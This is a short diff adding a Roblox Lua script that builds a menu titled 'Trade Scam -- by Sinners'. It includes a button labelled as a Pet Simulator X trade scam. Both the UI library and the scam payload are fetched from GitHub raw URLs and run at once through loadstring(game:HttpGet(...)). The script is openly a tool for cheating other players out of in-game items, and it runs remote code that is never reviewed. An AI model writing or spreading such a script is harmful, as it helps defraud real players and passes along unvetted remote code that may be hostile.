@@ -1,0 +1,8 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+
+local Window = Library.CreateLib("Trade Scam -- by Sinners", "Sentinel")
+local Tab = Window:NewTab("Main")
+local Section = Tab:NewSection("trade scam (CLICK IN TRADE)")
+Section:NewButton("PSX trade scam (CLICK WHILE IN TRADE)", "ButtonInfo", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Razzy2/psx-op-trade-gui/main/op-gui.txt'))()
+end)
